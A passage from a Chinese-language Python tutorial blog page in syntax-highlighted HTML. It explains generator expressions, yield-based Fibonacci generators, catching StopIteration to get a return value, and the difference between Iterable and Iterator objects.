punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>结果：<span class="token number">0</span><span class="token number">1</span><span class="token number">4</span><span class="token number">9</span><span class="token number">16</span><span class="token number">25</span><span class="token number">36</span><span class="token number">49</span><span class="token number">64</span><span class="token number">81</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"列表生成式.py"</span><span class="token punctuation">,</span> line <span class="token number">42</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>generator_ex<span class="token punctuation">)</span><span class="token punctuation">)</span>StopIteration<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误</strong>，而且上面这样不断调用是一个不好的习惯，正确的方法是使用for循环，因为generator也是可迭代对象。</p><p>所以我们创建一个generator后，基本上永远不会调用<code>__next__()</code>，而是通过for循环来迭代，并且不需要关心StopIteration的错误，generator非常强大，如果推算的算法比较复杂，用类似列表生成式的for循环无法实现的时候，还可以用函数来实现。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#生成器</span>generator_ex <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> generator_ex<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>结果：<span class="token number">0</span><span class="token number">1</span><span class="token number">4</span><span class="token number">9</span><span class="token number">16</span><span class="token number">25</span><span class="token number">36</span><span class="token number">49</span><span class="token number">64</span><span class="token number">81</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="2-2-函数创建生成器"><font color="#3CB371" face="Comic sans MS">2.2 函数创建生成器</font><a href="post/Python-generator-iterator#2-2-函数创建生成器"></a></h4><blockquote><p><font color="#FF7F00"><strong>如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个生成器。</strong></font></p></blockquote><br><p>下面举例子说明：</p><p>著名的斐波那契数列，除第一个和第二个数外，任何一个数都可以由前两个相加得到：</p><p>1，1，2，3，5，8，13，21，34…..</p><p>斐波那契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#fibonacci数列</span><span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token keyword">while</span> n <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>        a<span class="token punctuation">,</span>b <span class="token operator">=</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'done'</span>a <span class="token operator">=</span> fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token number">1</span><span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">5</span><span class="token number">8</span><span class="token number">1</span><span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">5</span><span class="token number">8</span>done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>a,b = b ,a+b  其实相当于 t =a+b ,a =b ,b =t  ，所以不必写显示写出临时变量t，就可以输出斐波那契数列的前N个数字。</p></blockquote><br><p>上面我们发现，print(b)每次函数运行都要打印，占内存，所以为了不占内存，我们也可以使用生成器，同样是使用函数，只不过函数中有 <code>yield</code> 语句，所以叫做生成器。但是返回的不再是一个值，而是一个生成器，和上面的例子一样。</p><p>那么这样就不占内存了，这里说一下generator和函数的执行流程，函数是顺序执行的，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用__next__()方法的时候执行，遇到yield语句返回，再次被__next__() 调用时候从上次的返回yield语句处继续执行，也就是用多少，取多少，不占内存。如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token keyword">while</span> n <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>        <span class="token keyword">yield</span> b        a<span class="token punctuation">,</span>b <span class="token operator">=</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">'done'</span>a <span class="token operator">=</span> fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token operator">&lt;</span>generator object fib at <span class="token number">0x000001C03AC34FC0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>下面用3个例子说明用for…in 循环的好处，但是拿不到return 语句的返回值，那么就会报错，所以为了不让报错，就要进行异常处理，拿到返回值，如果想要拿到返回值，必须捕获StopIteration错误，而返回值包含在StopIteration的value中。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token number">1</span><span class="token punctuation">.</span> 使用__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>方法到最后一个的下一个时会报错。<span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token keyword">while</span> n <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>        <span class="token keyword">yield</span> b        a<span class="token punctuation">,</span>b <span class="token operator">=</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">'done'</span>a <span class="token operator">=</span> fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"可以顺便干其他事情"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>结果：<span class="token operator">&lt;</span>generator object fib at <span class="token number">0x01058B70</span><span class="token operator">></span><span class="token number">1</span><span class="token number">1</span><span class="token number">2</span>可以顺便干其他事情<span class="token number">3</span><span class="token number">5</span><span class="token number">8</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token operator">//</span>看到报错，并且 StopIteration<span class="token punctuation">:</span> done  File <span class="token string">"3.py"</span><span class="token punctuation">,</span> line <span class="token number">18</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>StopIteration<span class="token punctuation">:</span> done<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">.</span> 在上面fib的例子，我们在循环过程中不断调用<span class="token keyword">yield</span>，就会不断中断。当然要给循环设置一个条件来退出循环，   不然就会产生一个无限数列出来。把函数改成generator后，我们基本上从来不会用next<span class="token punctuation">(</span><span class="token punctuation">)</span>来获取下一个   返回值，而是直接使用<span class="token keyword">for</span>循环来迭代，但是拿不到<span class="token keyword">return</span> 语句的返回值：<span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token keyword">while</span> n <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>        <span class="token keyword">yield</span> b        a<span class="token punctuation">,</span>b <span class="token operator">=</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">'done'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>结果：<span class="token number">1</span><span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">5</span><span class="token number">8</span>             <span class="token operator">//</span>程序没报错，但是拿不到<span class="token keyword">return</span>返回的值。<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">.</span> 如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：<span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token keyword">while</span> n <span class="token operator">&lt;</span> max<span class="token punctuation">:</span>        <span class="token keyword">yield</span> b        a<span class="token punctuation">,</span>b <span class="token operator">=</span>b<span class="token punctuation">,</span>a<span class="token operator">+</span>b        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">'done'</span>g <span class="token operator">=</span> fib<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> next<span class="token punctuation">(</span>g<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'generator: '</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span>    <span class="token keyword">except</span> StopIteration <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"生成器返回值："</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>value<span class="token punctuation">)</span>        <span class="token keyword">break</span>结果：generator<span class="token punctuation">:</span>  <span class="token number">1</span>generator<span class="token punctuation">:</span>  <span class="token number">1</span>generator<span class="token punctuation">:</span>  <span class="token number">2</span>generator<span class="token punctuation">:</span>  <span class="token number">3</span>generator<span class="token punctuation">:</span>  <span class="token number">5</span>generator<span class="token punctuation">:</span>  <span class="token number">8</span>生成器返回值： done      <span class="token operator">//</span>拿到了<span class="token keyword">return</span>的返回值！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="三-迭代器"><font color="#FF6347" face="Comic sans MS">三. 迭代器</font><a href="post/Python-generator-iterator#三-迭代器"></a></h3><blockquote><p><font color="#FF7F00"><strong>迭代就是循环，迭代器功能是把一个可迭代的对象转换为生成器。因为生成器本身就是可迭代的。</strong></font><br>迭代器包含有next方法的实现，在正确的范围内返回期待的数据以及超出范围后能够抛出StopIteration的错误停止迭代。</p></blockquote><br><blockquote><p><font color="#00B2EE"><strong>可以直接作用于for循环的数据类型有以下几种：</strong></font><br><font color="#FF7F00"><strong>一类是集合数据类型：</strong></font>如list,tuple,dict,set,str等；<br><font color="#FF7F00"><strong>一类是generator：</strong></font>包括生成器和带yield的generator 函数。</p></blockquote><br><br><h4 id="3-1-可迭代对象"><font color="#3CB371" face="Comic sans MS">3.1 可迭代对象</font><a href="post/Python-generator-iterator#3-1-可迭代对象"></a></h4><p>这些可以直接作用于for 循环的对象统称为<font color="#00B2EE"><strong>可迭代对象：Iterable</strong></font><br>可以使用 <strong><code>isinstance()</code></strong> 判断一个对象是否为可Iterable对象！</p><p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-isinstance.html" target="_blank" rel="noopener">Python isinstance() 函数</a>]</font></p><br><p><strong>语法</strong></p><p><code>isinstance(object, classinfo)</code></p><p><strong>参数</strong><br>object – 实例对象。<br>classinfo – 可以是直接或间接类名、基本类型或者由它们组成的元组。</p><p><strong>返回值</strong><br>如果两个参数类型（classinfo）相同则返回 True，否则返回 False。</p><br><br><h4 id="3-2-迭代器"><font color="#3CB371" face="Comic sans MS">3.2 迭代器</font><a href="post/Python-generator-iterator#3-2-迭代器"></a></h4><p>一个实现了iter方法的对象时可迭代的，一个实现next方法的对象是迭代器<br>可以被next()函数调用并不断返回下一个值的对象称为<font color="#00B2EE"><strong>迭代器：Iterator</strong></font>。<br>可以使用isinstance()判断一个对象是否是Iterator对象</p><p>所以，整体的流程为：</p><ol><li><p>使用isinstance()判断一个对象是否为Iterable对象（可迭代对象），语法为<code>isinstance(对象,Iterable)</code>。返回Ture/False。</p></li><li><p>如果返回 Ture，使用 <code>iter(可迭代对象)</code> 即可得到返回值为生成器的东西。</p></li><li><p>然后就可以把这个返回值作为生成器去尽情的使用了。</p></li></ol><br><p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-iter.html" target="_blank" rel="noopener">Python iter() 函数</a>]</font></p><blockquote><p><font color="#FF7F00"><strong>总结：</strong></font></p><ol><li>凡是可作用于for循环的对象都是Iterable类型；</li><li>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</li><li>生成器都是Iterator对象，但list、dict、str虽然是Iterable（可迭代对象），却不是Iterator（迭代器）。</li><li>iter()返回值是迭代器对象。</li></ol></blockquote><br><p>举例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> collections<span class="token punctuation">.</span>abc <span class="token keyword">import</span> Iterable<span class="token punctuation">,</span>Iterator<span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> Iterable<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Iterable<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> Iterable<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Iterable<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> Iterable<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span>iter<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span>iter<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Iterator<span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token boolean">True</span><span class="token boolean">True</span><span class="token boolean">True</span><span class="token boolean">True</span><span 